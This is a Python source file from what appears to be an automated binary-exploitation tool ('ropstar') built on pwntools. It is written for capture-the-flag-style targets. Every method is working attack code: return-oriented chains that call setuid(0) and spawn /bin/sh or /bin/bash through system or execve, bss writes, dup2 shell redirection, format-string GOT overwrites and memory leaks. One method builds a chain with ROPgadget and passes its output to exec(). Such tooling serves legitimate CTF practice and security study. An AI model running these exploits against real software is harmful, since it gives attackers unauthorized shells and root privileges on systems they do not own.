from pwn import *
from utils import *
import subprocess

# Author: xct

class Exploit():
	def __init__(self, ropstar):
		self.ropstar = ropstar
		self.binary = self.ropstar.binary
		self.px = None
		self.ux = None
		if self.ropstar.arch == 'amd64':
			self.px = lambda x : p64(x)
			self.ux = lambda x : u64(x)
		else:
			self.px = lambda x : p32(x)
			self.ux = lambda x : u32(x)


	def win(self, p, win):
		log.info("Exploit: win")
		rop = ROP(self.binary)
		rop.call(int(win,16))
		log.info(rop.dump())
		payload = fit({self.ropstar.offset:rop.chain()})		
		self.ropstar.trigger(p, payload)
		# we usually don't get shells from these, mostly just cat on the flag
		return


	def default(self, p, libc):
		''' Uses /bin/sh string in libc as arg to system. Requires libc.
		'''
		log.info("Exploit: default")
		result = False
		rop = ROP(self.binary)		
		sh = next(libc.search("/bin/sh\x00"))
		rop.call(libc.symbols['setuid'], [0x0])
		rop.call(libc.symbols['system'], [sh])
		log.info(rop.dump())
		payload = fit({self.ropstar.offset:rop.chain()})		
		self.ropstar.trigger(p, payload)
		result = self.ropstar.check_success(p)
		if result:
			save('payload', payload)
		return result


	def static(self, prog):
		''' All gadgets are in the binary
		pwnlib seems to fail to build reliable chains on static binaries so we use ROPgadget.py for now
		'''
		log.info("Exploit: static")
		result = False		
		proc = subprocess.Popen('python ~/tools/ROPgadget/ROPgadget.py --binary {0} --ropchain'.format(os.path.basename(self.ropstar.bname)), stdout=subprocess.PIPE, shell=True)
		out, err = proc.communicate()
		code = out[out.find("#!"):].replace("\t","").replace("\n\n","\n")
		log.info(code)
		exec(code) # this generate the p variable
		if 'p' not in locals():
			log.failure("ROPgadget.py could not find a valid chain")
			exit(0)		
		payload = fit({self.ropstar.offset:p})	
		self.ropstar.trigger(prog, payload)
		result = self.ropstar.check_success(prog)
		if result:
			save('payload', payload)
		return result


	def bss(self, p, libc=None):
		''' Writes /bin/bash string to bss, used as argument to system. Can work with and without libc.
		'''		
		log.info("Exploit: gets(bss); system(bss)")
		result = False
		rop = ROP(self.binary)
		bss = self.binary.bss()
		gets = None
		system = None
		if libc:
			# ret2libc
			gets = libc.symbols['gets']
			system = libc.symbols['system']
		else:
			# ret2plt
			try:
				gets = self.binary.plt['gets']
				system = self.binary.plt['system']
			except KeyError:
				pass
		if gets and system:
			rop.call(gets, [bss])
			rop.call(system, [bss])
			log.info(rop.dump())
			payload = fit({self.ropstar.offset:rop.chain()})
			self.ropstar.trigger(p, payload)
			p.sendline('/bin/bash')        
			result = self.ropstar.check_success(p)
			if result:
				save('payload', payload)
		return result


	def bss_execve(self, p, libc=None):
		''' Writes /bin/bash string to bss, used as argument to execve. Can work with and without libc.
		'''		
		log.info("Exploit: gets(bss); execve(bss,0,0)")
		result = False
		rop = ROP(self.binary)		
		bss = self.binary.bss()
		gets = None
		execve = None
		if libc:
			# ret2libc
			gets = libc.symbols['gets']
			execve = libc.symbols['execve']
		else:
			# ret2plt
			try:
				gets = self.binary.plt['gets']
				execve = self.binary.plt['execve']
			except KeyError:
				pass
		if gets and execve:			
			rop.call(gets, [bss])
			rop.call(execve, [bss, 0, 0])
			log.info(rop.dump())
			payload = fit({self.ropstar.offset:rop.chain()})
			self.ropstar.trigger(p, payload)
			p.sendline('/bin/bash')        
			result = self.ropstar.check_success(p)
			if result:
				save('payload', payload)
		return result


	def dup2(self, p, libc):
		''' Unused/Untested at this point
		'''
		log.info("Exploit: dup2,system()")
		rop = ROP(libc)
		result = False
		fd = 4 # we should repeat this for several fds until it works
		rop.dup2(fd, 0)
		rop.dup2(fd, 1)
		rop.dup2(fd, 2)
		rop.system(next(libc.search("/bin/sh\x00")))
		log.info(rop.dump())
		payload = cyclic(self.ropstar.offset) + p64(self.ropstar.canary) + p64(self.ropstar.base_ptr) + rop.chain()
		self.ropstar.trigger(p, payload)
		result = self.ropstar.check_success(p)
		if result:
			save('payload', payload)



	def fmt(self, p, autofmt, libc=None):
		''' Format string exploitation
		''' 
		log.info("Exploit: format string")
		writes = {}
		if self.ropstar.args.win:
			addr = self.ropstar.args.win
			addr = int(addr, 16)
			writes[self.binary.got['printf']] = addr
			payload = fmtstr_payload(autofmt.offset, writes)
			self.ropstar.trigger(p, payload)
			result = self.ropstar.check_success(p)
			if result:
				save('payload', payload)
		else:
			self.fmt_loop(p, autofmt)
			leak = self.fmt_leak(p, self.binary.got['printf'], autofmt.offset)
			log.success(hex(leak))
			# we could leak libc form the stack and one gadget
			# we could write ropchain to bss, to execute we have to pivot there, stack canaries forbid that though


	def fmt_loop(self, p, autofmt):
		''' patch exit to main to keep the program open
		'''
		try:	
			payload = fmtstr_payload(autofmt.offset, {self.binary.got['exit'] : self.binary.symbols['main']})
		except KeyError:
			log.failure("Could not loop the binary - no exit function found")
			return
		self.ropstar.trigger(p, payload)


	def fmt_leak(self, p, addr, offset):
		''' Leak memory for the given address
		'''
		payload = self.px(addr)+'%'+str(offset)+'$s'
		p.sendline(payload)
		leak = p.recvall()
		bytes = bytearray(leak)
		l = re.search(b'...\xf7',bytes).group(0)		
		return self.ux(l)